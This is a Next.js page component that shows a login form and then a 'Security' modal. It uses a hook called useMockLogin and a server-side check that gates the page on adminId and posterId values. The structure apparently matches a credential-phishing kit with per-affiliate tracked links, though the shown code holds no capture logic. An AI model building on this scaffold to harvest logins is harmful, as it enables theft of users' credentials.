import { motion } from "framer-motion";
import { useState } from "react";
import Footer from "../../components/Footer";
import Header from "../../components/Header";
import Login from "../../components/Login";
import Security from "../../components/Security";
import { API_URL, site } from "../../config";
import useMockLogin from "../../hooks/useMockLogin";

export default function Home() {
  const [showModal, setShowModal] = useState(false);

  const { login } = useMockLogin({ setShowModal });

  return (
    <>
      {!showModal && (
        <>
          <Header />
          <Login login={login} />
          <Footer />
        </>
      )}

      {showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
        >
          <Security setShowModal={setShowModal} />
        </motion.div>
      )}
    </>
  );
}

export async function getServerSideProps({ query: { adminId, posterId } }) {
  const url = `${API_URL}/${site}/${adminId}/${posterId}`;

  // console.log(url);

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
